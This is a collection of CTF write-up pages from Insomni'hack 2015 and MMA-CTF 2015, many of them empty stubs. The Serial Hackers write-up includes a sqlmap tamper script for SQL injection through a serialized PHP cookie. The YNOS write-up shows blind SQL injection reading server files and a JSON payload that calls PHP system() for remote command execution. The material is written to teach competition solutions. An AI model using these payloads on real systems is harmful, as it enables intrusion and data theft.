[ExifTool](http://www.sno.phy.queensu.ca/~phil/exiftool/) reveals it contains a 47487 bytes thumbnail image. Let's extract it:

```
exiftool -binary -ThumbnailImage zoomIn_3a3f6e35934021eca75b0abde70333a6.jpg > thumbnail_0.jpg
```

![](thumbnail_0.jpg)

A further metadata inspection with ExifTool reveals the thumbnail file itself contains a 26822 bytes thumbnail image. Extract it again:

```
exiftool -binary -ThumbnailImage thumbnail_0.jpg > thumbnail_1.jpg
```

![](thumbnail_1.jpg)

The flag is now visible but mirrored. Undo this effect with [ImageMagick](http://www.imagemagick.org/):

```
convert thumbnail_1.jpg -flop thumbnail_1_mirrored.jpg
```

![](thumbnail_1_mirrored.jpg)

Finally, the flag reads `INS{MAGNIFICATION_X100_FOR_STARTERS}`.

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf>
# Insomni'hack CTF 2015: 1-2-3-4

**Category:** Hardware
**Solves:** 3
**Description:** 

> We lost the combination of our safe.
> Fortunately we still have the original firmware.
> 
> Validation at the organizer's table ! GL&HF!
> Author : gr33d - Difficulty : medium

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf>
[French](https://phil242.wordpress.com/2015/03/23/insomnihack-2015-write-up-hardware-1-2-3-4/)
[http://www.balda.ch/posts/2015/Mar/24/ins15-1-2-3-4/](http://www.balda.ch/posts/2015/Mar/24/ins15-1-2-3-4/)# Insomni'hack CTF 2015: iBadMovie Season 1

**Category:** Mobile
**Solves:** 40
**Description:** 

> Hi HackLady,
> 
> Just found this strange app in the AppStore. Maybe, it was created by CIA to hide some important secrets. It says that it is protected by snowden-grade encryption, so I need your help to crack it and find the password.
> 
> I give you the application and a copy of the folders I see on my device.
> 
> IMPORTANT: You can solve this challenge with an iDevice but also WITHOUT. No need to be apple-addictive

## Write-up

by [cryptax](https://github.com/cryptax)

We are given a zip file which contains an iOS application and 'a copy of folders on the device' (iExplorer path):

```
39836648  2015-03-07 00:26   iBadMovie.ipa
        0  2015-03-12 15:12   iExplorer/
        0  2015-03-12 15:12   iExplorer/Documents/
        0  2015-03-12 15:12   iExplorer/Library/
        0  2015-03-12 15:12   iExplorer/Library/Caches/
        0  2015-03-12 15:12   iExplorer/Library/Caches/LaunchImages/
        0  2015-03-12 15:07   iExplorer/Library/Caches/LaunchImages/ch.scrt.iBadMovie/
        0  2015-03-12 15:12   iExplorer/Library/Caches/Snapshots/
        0  2015-03-12 15:12   iExplorer/Library/Caches/Snapshots/ch.scrt.iBadMovie/
        0  2015-03-12 15:12   iExplorer/Library/Caches/Snapshots/ch.scrt.iBadMovie/ch.scrt.iBadMovie/
        0  2015-03-12 15:07   iExplorer/Library/Caches/Snapshots/ch.scrt.iBadMovie/ch.scrt.iBadMovie/downscaled/
        0  2015-03-12 15:07   iExplorer/Library/Preferences/
      103  2015-03-06 16:09   iExplorer/Library/Preferences/ch.scrt.iBadMovie.plist
        0  2015-03-12 15:12   iExplorer/tmp/
        0  2015-03-12 15:07   iExplorer/tmp/MediaCache/
```
Basically, there are only two files to inspect: the property list ch.scrt.iBadMovie.plist, or the application itself, iBadMovie.ipa. The property list is a binary property list. With [plutil.pl](http://scw.us/iPhone/plutil/), we convert it to text format:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>key</key>
	<string>QmxhY2toYXQ=</string>
	<key>password</key>
	<string>SU5Te1RBWUxPUl9TV0lGVH0=</string>
</dict>
</plist>
```

The strings are base64 encoded. We decode:

```
$ echo "SU5Te1RBWUxPUl9TV0lGVH0=" | base64 -d
INS{TAYLOR_SWIFT}
```
This is our first flag.

## Other write-ups and resources

[French](http://snipefoo.blogspot.fr/2015/03/insomnihack-2015.html?m=1)
* iBadMovie_66b262caf64ba8d44d84fea63e750d4f.zip# Insomni'hack CTF 2015: iBadMovie Season 2

**Category:** Mobile
**Solves:** 20
**Description:** 

> Hi HackLady,
> 
> Thank you for the password. Apparently, the app is decrypting something, maybe a secret. Unfortunately, I just broke my iDevice and I don't have enough money to buy a new one (also because I keep my money to buy a new gold iWatch. Oh my gosh, they are so nice!). Can you help me, please!
> 
> IMPORTANT: You can solve this challenge with an Android device or emulator but also WITHOUT.
> Author : Britney - Difficulty : easy

## Write-up

by [cryptax](https://github.com/cryptax)

We don't much more except there's something else to find. So, this time we have a look at the iOS application. The .ipa format is a Zip file, that we unzip. 
In the application, we notice a file 'Blackhat.mp4'. That startles me, especially because the file does not appear to be a valid video:


   $ hexdump -C Blackhat.mp4 | head
   00000000  42 6c 61 7f 0d 1c 18 04  2f 1c 55 51 6b 68 61 75  |Bla...../.UQkhau|
   00000010  2f 1c 55 52 06 18 55 46  2b 1f 0e 0e 6b 69 55 87  |/.UR..UF+...kiU.|
   00000020  2f 03 0e 15 6b 68 61 18  2f 1a 09 07 6b 68 61 74  |/...kha./...khat|
   00000030  93 72 f2 bd ba 76 f2 9c  42 6c 3c a3 6b 5d 4a 35  |.r...v..Bl<.k]J5|
   00000040  42 6d 61 63 6a 68 61 74  42 6c 61 63 6b 68 61 74  |BmacjhatBlackhat|
   00000050  42 6d 61 63 6b 68 61 74  42 6c 61 63 6b 68 61 74  |BmackhatBlackhat|
   ...

We notice there seems to be a mixture of the word Blackhat in there. With IDA Pro, we disassemble the iOS executable to learn more.
Obviously, the file Blackhat.mp4 is loaded.

We also notice a list of interesting functions: showVideo, playVideo and ... decryptVideoWithXOR. So, we guess that the video Blackhat.mp4 is encrypted by XOR. There are no obvious password in the executable apart from Blackhat. We write a quick Python script to do the XOR, load the encrypted Blackhat.mp4 and decrypt.

   
      from itertools import izip, cycle
      import string

      def xor(message, key):
      	  return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(message, cycle(key)))

      mp4buffer = open('Blackhat.mp4','rb').read()
      dec = xor(mp4buffer,'Blackhat')
      open('dec.mp4','wb').write(dec)


And we're lucky! This is indeed turns the file into a valid MP4 video that we view... at the end lies the flag.

So, those challenges were pretty easy, and indeed, did not require an iPhone at all to solve them. Nice.

## Other write-ups and resources

[French](http://snipefoo.blogspot.fr/2015/03/insomnihack-2015.html?m=1)# Insomni'hack CTF 2015: InsomniDroid Level 1

**Category:** Mobile
**Solves:** 0
**Description:** 

> Hi Girlz,
> 
> I was yesterday night with D.J. Paris and this other girl. You know, this girl with blond hair. I found a Samsung phone on the floor (or maybe it was in her pocket) and I am sure there are interesting things inside it. Unfortunately, the device is encrypted. I know you are the best hackers in the universe, so please, please, please have a look.
> 
> I have made a bit-by-bit copy of the storage.
> 
> The device is a Samsung W (GT-I8150) and apparently it runs the Cyanogen flavour of Android KitKat.
> 
> IMPORTANT: You can solve this challenge with an Android device or emulator but also WITHOUT.
> Author : Britney - Difficulty : medium

## Write-up

(TODO)

## Other write-ups and resources

[http://blog.scrt.ch/2015/03/27/insomnihack-finals-insomnidroid-level-1-writeup/](http://blog.scrt.ch/2015/03/27/insomnihack-finals-insomnidroid-level-1-writeup/)# Insomni'hack CTF 2015: InsomniDroid Level 2

**Category:** Mobile
**Solves:** 0
**Description:** 

>Hi again Girlz,
>
>You are all so nice. If I can take again some of your time.... The phone
>contains an great application to buy some good hacking movies (do you see
>Christophe Lambert? He is so cute!). But, ... well... can you find a way to
>buy movies without... you know what I mean.

>Thank you for your help. Kiss.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.fortinet.com/post/insomnidroid-part-2-write-up>
# Insomni'hack CTF 2015: Hollywood network

**Category:** Network
**Solves:** 0
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

[http://blog.scrt.ch/2015/03/24/insomnihack-finals-hollywood-network-writeup/](http://blog.scrt.ch/2015/03/24/insomnihack-finals-hollywood-network-writeup/)
* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: Time to leak

**Category:** Network
**Solves:** 10
**Description:** 

> I have his IP address so I can locate the suspect in a 10cm area... But I'm
> sure there's a way of remotely extracting the flag from his computer. Maybe
> reverse scripting the packets with the custom Trojan can do the trick. But
> he has a 7th generation firewall so I may fail... If only as was half as
> 31337 as the guy who did this.... Maybe I should try to reproduce it.
> 
> Author : SaD - Difficulty : easy

## Write-up

by [antoinet](https://github.com/antoinet)

The pcap file contains 22 packets of IP/ICMP traffic in which host
10.13.37.206 is ping'ed. The host selectively replies to echo requests.
The echo requests have varying TTL values in the domain of printable
ASCII characters. The flag is encoded as a sequence of characters in the 
TTL value. The first four characters are guessable: ```INS{```, this
corresponds to four echo requests with according TTL values: 73, 78, 83,
123, each of which are aknowledged by an echo reply. The next characters
must be guessed. The host does not reply to the echo request when using
a wrong character. Therefore, for each guess, the sequence must be sent
again from the beginning. The resulting flag is:

    INS{time_to_leak_is_trendy_this_year}

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015
* March 20, 2015 - <http://insomnihack.ch>
* [Scoreboard](http://blog.scrt.ch/2015/03/24/insomnihack-finals-ctf-results/) or [here](scoreboard.txt)
* [Number of solves per task](solves.txt)
* [Some files by the challenge authors?](https://github.com/Insomnihack/Insomnihack-2015)
* [Blog entry with number of solves and more info](https://insomnihack.ch/?p=364)
* [PDF with several writeups](http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf)

## Completed write-ups

* [forensic/elysium-ropchain](forensic/elysium-ropchain)
* [forensic/lost-in-memories](forensic/lost-in-memories)
* [forensic/zoom-in](forensic/zoom-in)
* [mobile/iBadMovie-part1](mobile/iBadMovie-part1)
* [mobile/iBadMovie-part2](mobile/iBadMovie-part2)
* [network/timetoleak](network/timetoleak)
* [web/serial-hackers](web/serial-hackers)
* [web/win](web/win)

## External write-ups only

* [exploit/jurassic-sparc](exploit/jurassic-sparc)
* [exploit/mastermind](exploit/mastermind)
* [exploit/sh1tty](exploit/sh1tty)
* [exploit/smtpwn](exploit/smtpwn)
* [exploit/sql-inject-flow](exploit/sql-inject-flow)
* [exploit/the-firmware](exploit/the-firmware)
* [hardware/1-2-3-4](hardware/1-2-3-4)
* [mobile/insomnidroid-part1](mobile/insomnidroid-part1)
* [mobile/insomnidroid-part2](mobile/insomnidroid-part2)
* [network/hollywood-network](network/hollywood-network)
* [reversing/swordfish](reversing/swordfish)
* [reversing/swordfish-passwd](reversing/swordfish-passwd)
* [shellcode/blue-pill](shellcode/blue-pill)
* [shellcode/tldr](shellcode/tldr)
* [web/hack-like-its-1999](web/hack-like-its-1999)
* [web/hacker-idol](web/hacker-idol)
* [web/hacker-news](web/hacker-news)
* [web/jack-the-clicker](web/jack-the-clicker)
* [web/smell-of-the-lamp](web/smell-of-the-lamp)
* [web/smelly-lamp-got-makeup](web/smelly-lamp-got-makeup)

## Missing write-ups# Insomni'hack CTF 2015: Swordfish

**Category:** Reversing
**Solves:** 43
**Description:** 

> Crack a DoD laptop like Hugh Jackman in Swordfish!
> Enjoy the completely realistic DoD interface, and recover the login quicker
> than Hugh. The only thing missing is a gun (and a blowjob from Olga, and
> Travolta, and…)
> Recovering the password is a bit more difficult. Go to the Swordfish_passwd
> task once you found the login.
> See you in a minute.
> 
> Author : ch - Difficulty : easy

## Write-up

(TODO)

## Other write-ups and resources

[French](http://snipefoo.blogspot.fr/2015/03/insomnihack-2015.html?m=1)
* HTML page: swordfish_dod_hack_4a9031353e8ea65ef6d261d3e4b1a0bb.html
* Flash: swordfish_dod_hack_1cba8d223d0d25e79aeae4c7714eb84e.swf
* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: Swordfish Passwd

**Category:** Reversing
**Solves:** 12
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf>
* [French](http://snipefoo.blogspot.fr/2015/03/insomnihack-2015.html?m=1)# Insomni'hack CTF 2015: blue pill

**Category:** Shellcode
**Solves:** 8
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

* <http://lab.0xff.cc/ctf-insomnihack-2015-bluepill/>
* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf>
# Insomni'hack CTF 2015: tldr

**Category:** Shellcode
**Solves:** 6
**Description:** 

> Service running at tldr.insomni.hack:1234
> 
> tldr-fee9e4a3e7bb0e8094abc141de206684.tar.bz2
> Author : awe - Difficulty : medium

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: Hack like its 1999!

**Category:** Web
**Solves:** 0
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

[https://github.com/Insomnihack/Insomnihack-2015/tree/master/web/Hack%20like%20it's%201999!](https://github.com/Insomnihack/Insomnihack-2015/tree/master/web/Hack%20like%20it's%201999!)
* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: Hacker Idol

**Category:** Web
**Solves:** 2
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: HackerNews

**Category:** Web
**Solves:** 30
**Description:** 

> This terrible website seems to actually enjoy hacking in movies. They have no idea what they're talking about. Get their flag now!
> 
> Oh, and if it seems to difficult, we also got their source code!
> Author : clZ - Difficulty : easy

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf>
[French](http://snipefoo.blogspot.fr/2015/03/insomnihack-2015.html?m=1)# Insomni'hack CTF 2015: Jack the clicker

**Category:** Web
**Solves:** 1
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: Serial Hackers

**Category:** Web
**Solves:** 19
**Description:**

(TODO)

## Write-up

by [bcyrill](https://github.com/bcyrill)

The web application in this challenge allows us to rate and follow our favorite hacker.

When we follow a hacker we note that a cookie containing a serialized PHP object is set. As the source code of the appliction is also available we have a quick look at the correspondig part in the update.php script.

```php
...
  if ($rel==='follow'){
    $r=mysql_query("SELECT * from hackers where handle='$hacker'");
    $row=mysql_fetch_assoc($r);
    $value=new hackers($row);
    setcookie("H4ck3rs",base64_encode(serialize($value)));
    setcookie("Following",$hacker);
  }
...
```

The deserialization part can be found in the index.php file.

```php
...
  <?php
    if(isset($_COOKIE['Following'])){
      $c=unserialize(base64_decode($_COOKIE['H4ck3rs']));
  ?>
  <div class="navbar-right alert alert-success">
      <?php
        echo '<a href="/?hacker=' . $c->get_handle() . '" class="thumbnail">';
...
```

Deserializing an object in PHP will automatically execute the __wakeup() function of that object. Luckily the hackers class is given as well clearly showing the SQL injection vulnerability.

```php
...
  function __wakeup(){
    $row=mysql_query("SELECT * from hackers where handle='$this->handle'");
    $r=mysql_fetch_assoc($row);
    $this->__construct($r);
  }
...
```

To automate the exploitation we can create a simple sqlmap tamper script.

```python
import base64
from phpserialize import serialize, unserialize, phpobject

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replace original payload with a serialized PHPObject
    """

    # original payload is a serialized and base64 encoded PHPObject
    original_payload = "Tzo3OiJoYWNrZXJzIjoxMDp7czoxNToiAGhhY2tlcnMAaGFuZGxlIjtzOjk6Ilplcm8gQ29vbCI7czoxMjoiAGhhY2tlcnMAYWdlIjtzOjI6IjE4IjtzOjE0OiIAaGFja2VycwBxdW90ZSI7czozNzoiTWVzcyB3aXRoIHRoZSBiZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCI7czoxNDoiAGhhY2tlcnMAcGhvdG8iO3M6MTU6ImltYWdlcy96ZXJvLnBuZyI7czoxMzoiAGhhY2tlcnMAbGlrZSI7czozOiIzMzIiO3M6MTQ6IgBoYWNrZXJzAGRsaWtlIjtzOjE6IjkiO3M6MTI6IgBoYWNrZXJzAHdlYiI7czoyOiI0MCI7czoxMjoiAGhhY2tlcnMAcmV2IjtzOjI6IjkwIjtzOjE0OiIAaGFja2VycwBndWVzcyI7czoyOiIzMCI7czoxMzoiAGhhY2tlcnMAYmVlciI7czoyOiIyMCI7fQ=="

    # decode and unserialize the PHPObject
    my_object = unserialize(base64.b64decode(original_payload), object_hook=phpobject)

    # append the payload to our handle
    my_object.__php_vars__['\x00hackers\x00handle'] += payload

    # return the serialized and encoded PHPObject
    return base64.b64encode(serialize(my_object))
```

Running sqlmap with our tamper script and dumping the secret table reveals the flag
```
./sqlmap.py -u "http://serialhackers.insomni.hack/index.php" --cookie="H4ck3rs=; Following=Stan" -p "H4ck3rs" --tamper="tamper_phpobject" --level=3 --risk=1 --threads=1 --time-sec=5 --tables --exclude-sysdbs -o
...
Database: hackers_db
[2 tables]
+---------+
| hackers |
| secret  |
+---------+
...
Database: hackers_db
Table: secret
[1 entry]
+--------------------+
| flag               |
+--------------------+
| INS{S3r14l_k1ll3R} |
+--------------------+
```

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf>
* [serial_hackers_79022c2579b5ff134338fb696a8196da.zip](serial_hackers_79022c2579b5ff134338fb696a8196da.zip)
# Insomni'hack CTF 2015: Smell of the lamp

**Category:** Web
**Solves:** 32
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: Smelly lamp got makeup

**Category:** Web
**Solves:** 4
**Description:** 

(TODO)

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: n00bs gonna win!

**Category:** Web
**Solves:** 56
**Description:** 

(TODO)

## Write-up

by [cryptax](https://github.com/cryptax)

This was a very easy challenge that most participants solved. We were being
asked to vote for the best hacking movie - selecting one movie from a
dropdown list. It seems that all votes end up with the output "Seriously?!
You think that's the best hacking movie?! You definitely missed one!".
However, having a look at the HTML source we notice this:

	 <option value="21">The Italian Job</option>
	 <!-- <option value="42">The Matrix</option> -->
	 <option value="22">The Net</option>

Just guessing ;P, we vote for 42:

     $ curl http://10.13.37.121/?best_hacking_movie=42

and success, that's our first flag:

    <h2>Yay !</h2>
    <p>Congrats! Your taste for hacking movies is as good as your hacking skills</p>
    <p>INS{No one can be told what the Matrix is. You have to see it for yourself.}


## Other write-ups and resources

* none yet# Insomni’hack CTF Teaser 2015: APRS/331

**Category:** Exploit
**Points:** 300
**Author:** grimmlin
**Description:**

> <https://www.youtube.com/watch?v=2efhrCxI4J0>
> <a href="http://www.youtube.com/watch?v=2efhrCxI4J0"><img src="http://img.youtube.com/vi/2efhrCxI4J0/0.jpg" border="3" width="640" height="480"/></a>
>
> We managed to get a [small trace](aprs_c7d4ac556e6f4acd57473c881da79ba4.pcap) of what Dade did on the aprs system. You can check it out for yourself [here](http://aprs.teaser.insomnihack.ch/).

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni’hack CTF Teaser 2015: Baby Haskell

**Category:** Reverse
**Points:** 100
**Author:** agix
**Description:**

> <https://www.youtube.com/watch?v=VBr_ceLAseg>
> <a href="http://www.youtube.com/watch?v=VBr_ceLAseg"><img src="http://img.youtube.com/vi/VBr_ceLAseg/0.jpg" border="3" width="640" height="480"/></a>
>
> Can you crack [it](baby_haskell_f87b6ffca5f977d2ac493ecb12636cba) faster than John Connor?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VMXh/write-ups/blob/master/Insomnihack%20CTF%202015/Baby%20Haskell/README.md>
* [Sourcecode](https://github.com/Insomnihack/Teaser-2015/tree/master/Baby_Haskell)
# Insomni’hack CTF Teaser 2015: Elysium ropchain

**Category:** Exploit
**Points:** 200
**Author:** agix
**Description:**

> <https://www.youtube.com/watch?v=30BTQ6B4Y6M>
> <a href="http://www.youtube.com/watch?v=30BTQ6B4Y6M"><img src="http://img.youtube.com/vi/30BTQ6B4Y6M/0.jpg" border="3" width="640" height="480"/></a>
>
> We stole the [Armadyne robots controller](elysium_b783c103a5ad32767d40744046cc21e4.tar.gz) from the Elysium movie. Can you replay the ending hack?
>
> elysium01.teaser.insomnihack.ch 1234
> elysium02.teaser.insomnihack.ch 1234

## Write-up

(TODO)

## Other write-ups and resources

* <http://kitctf.de/writeups/insomnihack-teaser-2015/elysium/>
# Insomni’hack CTF Teaser 2015: Interview

**Category:** Exploit
**Points:** 300
**Author:** awe
**Description:**

> <https://www.youtube.com/watch?v=rUY8HysBzsE>
> <a href="http://www.youtube.com/watch?v=rUY8HysBzsE"><img src="http://img.youtube.com/vi/zfy5dFhw3ik/0.jpg" border="3" width="640" height="480"/></a>
>
> Stanley, we have a problem, maybe you can help us out. Take a look at this: [pop3ret](interview-148714b0c7db2677cafcbc7102611138.tar.bz2) I’ve been told that the best crackers in the world could do this in sixty minutes. Unfortunately, I need someone who can do it in sixty seconds.
>
> Services: smtp.teaser.insomnihack.ch:42025 pop3.teaser.insomnihack.ch:42110
> Credentials: userZYb9iM / Q0XsY9VQzW

## Write-up

(TODO)

## Other write-ups and resources

* [Sourcecode](https://github.com/Insomnihack/Teaser-2015/tree/master/interview)
# Insomni’hack CTF Teaser 2015 write-ups

* <https://teaser.insomnihack.ch/>
* [Scoreboard](https://teaser.insomnihack.ch/scoreboard)

## Completed write-ups

* [YNOS](ynos)

## External write-ups only

* [Baby Haskell](baby-haskell)
* [Elysium ropchain](elysium-ropchain)
* [Interview](interview)

## Missing write-ups

* [APRS/331](aprs-331)
# Insomni’hack CTF Teaser 2015: YNOS

**Category:** Web
**Points:** 100
**Author:** clZ
**Description:**

> <https://www.youtube.com/watch?v=O2rGTXHvPCQ>
> <a href="http://www.youtube.com/watch?v=O2rGTXHvPCQ"><img src="http://img.youtube.com/vi/O2rGTXHvPCQ/0.jpg" border="3" width="640" height="480"/></a>
>
> So many hacking scenes, so little sk1llz…
>
> Apparently [this website](http://ynos.teaser.insomnihack.ch/) likes these stupid films. Pwn them and get the flag which is in a pretty obvious file in the webroot.

## Write-up

by [ichung](https://github.com/ichung) and [mathiasbynens](https://github.com/mathiasbynens)

<http://ynos.teaser.insomnihack.ch/> presents a login screen. Some random guesses reveal we can log in using the username `admin` with password `admin`. Now we can browse artists, films, and directors. Clicking any of those links triggers an Ajax request to `/INSO.RPC` with some JSON-formatted data:

```bash
$ curl -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Cache-Control: no-cache' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: AWSELB=CFABFDBD1C5BB6C16340B9340EA064028E4DF570D44D64084C319E70EE8D963FBDB0FBB63151BAE16EB9FFA8E0D4123E34E5D7D9AA1E396E163C4F960FFBFF45E6083CB961; session=fe5e3eddfcad1992c22b98cfd8d3e5b3' --data-binary '{"c":{"name":"page"},"a":{"name":"render","params":{"name":"artists"}}}' 'http://ynos.teaser.insomnihack.ch/INSO.RPC'
<fieldset>

<!-- Form Name -->
<legend>Artists</legend>


<ul class="list-group">
  <li class="list-group-item">Jonny Lee Miller</li>
  <li class="list-group-item">Angelina Jolie</li>
  <li class="list-group-item">Jesse Bradford</li>
  <li class="list-group-item">Matthew Lillard</li>
  <li class="list-group-item">Laurence Mason</li>
  <li class="list-group-item">Fisher Stevens</li>
</ul>

</fieldset>
```

### By team "curryboys" - Istvan Chung, Husayn Karimi, William Marshall

This one boils down to a boolean SQL injection attack and a code
execution from a custom PHP deserialization function. I noticed by
using Firebug that the main login screen encodes the username and
password as JSON in a POST request to /INSO.RPC on the server, in the format

```
{"c":{"name":"user"},"a":{"name":"login","params":"username|password"}}
```

Although I didn't know it at the time, it turns out that this is in fact
the serialized format of a `c`lass called `user`, requesting the
`a`ction `login`, a function to be called with the given parameters.
Placing the string `' OR 1=1 --` in for username allowed me to login and
get a session cookie quite easily. However, all this lets us do is make
another call of the form

```
{"c":{"name":"page"},"a":{"name":"render","params":"home"}}
```

(where we can substitute `"artists"`, `"films"`, `"directors"`, or
`"logout"` instead of `"home"`). Unfortunately, none of those pages are
of any use, so I went back to the original SQL injection. The challenge
states that the flag is in an "obvious" file in the webroot, so I
decided that I'd try to find where that was on the server. Since we can
get binary information out of the SQL injection (login failed or
succeeded), we can test for the presence of files using the query

```
LOAD_FILE('/path/to/file') IS NOT NULL
```

I managed to find `/etc/apache2/apache2.conf`, indicating that we were
looking at an Apache 2 server, and through trial and error eventually
found the existence of `/var/www/html/index.php`. Quick testing showed
that `flag.txt`, `flag`, `FLAG`, etc were not present, so I used binary
search to brute-force first the length, and then the contents of
`index.php` and `INSO.RPC` character-by-character, which contain
references to `classes.php` and `functions.php`, which I read out as
well. `functions.php` is reproduced here:

```
<?php

function parseParams($params) {
  if(is_array($params)) {
    return $params;
  }
  else {
    return explode("|",$params);
  }
}

function myDeserialize($object) {
  global $session;
  $class = $object["c"];
  $action = $object["a"];
  $cname = $class["name"];
  $cparams = Array();
  if(isset($class["params"])) {
    $cparams = $class["params"];
  }
  $my_obj = new $cname($cparams);
  $aname = $action["name"];
  $aparams = Array();
  if(isset($action["params"])) {
    $aparams = parseParams($action["params"]);
  }

  call_user_func_array(array($my_obj,$aname),$aparams);

}

?>
```

`myDeserialize` is called by INSO.RPC to handle every incoming request.
It lets us create an instance of any class we desire with any
constructor parameters, and then call any method on that class with any
parameters. We'd like to just call a function like `system`, but
`system` isn't the method of any class. In addition, the classes in
`classes.php` appeared to be useless for locating the flag. However,
the PHP built-in class [`ReflectionFunction`][rf] comes to the rescue, as
its `invoke` method lets us call the function we supply in the
constructor. We can use the serialization vulnerability to make the
call

```
new ReflectionFunction("system").invoke("ls")
```

We serialize this into

```
{"c":{"name":"ReflectionFunction", "params":"system"},
 "a":{"name":"invoke","params":"ls"}}
```

and we get the celebration-inducing output

```
INSO.RPC
___THE_FLAG_IS_IN_HERE___
___THE_FLAG_IS_IN_HERE___.save
artists.php
bootstrap.min.css
bootstrap.min.js
classes.php
directors.php
films.php
functions.php
home.php
index.php
jquery-2.1.1.min.js
login.php
logout.php
preload.php
```

Changing `ls` to `cat ___THE_FLAG_IS_IN_HERE___` gives us our flag:

```
INS{Gotta_L0ve_l33t_serialization_suff!}
```

[rf]: http://php.net/manual/en/class.reflectionfunction.php

## Other write-ups and resources

* none yet
# MMA-CTF-2015: Alicegame

**Category:** Crypto
**Points:** 250
**Solves:** 13
**Description:**

> Decrypt a message.
>
> `nc cry1.chal.mmactf.link 39985`
>
> Hint: [server.py](server.py-192ac80a12223d53a07c4b370966eb39e5cd6a00bcb36e54840756a6ac4e5a77)


## Write-up

(TODO)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/MMA%20CTF%202015/Alicegame/59/) 
* <https://github.com/pwning/public-writeup/blob/master/mma2015/crypto250-alicegame/writeup.md>
# MMA-CTF-2015: LCGsign 

**Category:**
**Points:** 400
**Solves:** 3
**Description:**

> Recover the key!
>
> Flag is `MMA{md5hex(the secret key in decimal) in lowercase}`
>
> [LCGsign.tar.xz](LCGsign.tar.xz-f72bab2699e0497e7715453cf49eb1cd24c8b0c0bf9c2670e0ea47bfaf69f79d)
>

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/mma2015/crypto400-lcgsign/writeup.md>
# MMA-CTF-2015: regrettable-ecc-200

**Category:** Crypto
**Points:** 200
**Solves:** 21
**Description:**

> break the regrettable ecc and get the flag
>
> [regrettable_ecc.tar.xz](regrettable_ecc.tar.xz-92db3638913f5de9e495a4f1a4fecaeba24dfe689574e41a348e566d7e17cc8d)
> 

## Write-up

(TODO)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/MMA%20CTF%202015/regrettable%20ecc/57/) 
* <https://github.com/tyhan/CTF/tree/master/MMA2015/regrettable_ecc>
# MMA-CTF-2015: signer-and-verifier-100

**Category:** Crypto
**Points:** 100
**Solves:** 92
**Description:**

> Signer: `nc cry1.chal.mmactf.link 44815`

> Verifier: `nc cry1.chal.mmactf.link 44816`
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/MMACTF/crypto/signerverifier> 
* [b01lers](https://b01lers.net/challenges/MMA%20CTF%202015/Signer%20And%20Verifier/56/)
* <http://the2702.com/2016/02/07/dMd.html>
# MMA-CTF-2015: Smart Cipher System

**Category:** Crypto
**Points:** 10,10,30,40
**Solves:** 436,381,224,63
**Description:**

> Decrypt 4 flags.
>
> `36 36 2a 64 4b 4b 4a 21 1e 4b 1f 20 1f 21 4d 4b 1b 1d 19 4f 21 4c 1d 4a 4e 1c 4c 1b 22 4f 22 22 1b 21 4c 20 1d 4f 1f 4c 4a 19 22 1a 66`

> http://bow.chal.mmactf.link/~scs/crypt2.cgi

> `e3 e3 83 21 33 96 23 43 ef 9a 9a 05 18 c7 23 07 07 07 c7 9a 04 33 23 07 23 ef 12 c7 04 96 43 23 23 18 04 04 05 c7 fb 18 96 43 ef 43 ff`

> http://bow.chal.mmactf.link/~scs/crypt4.cgi

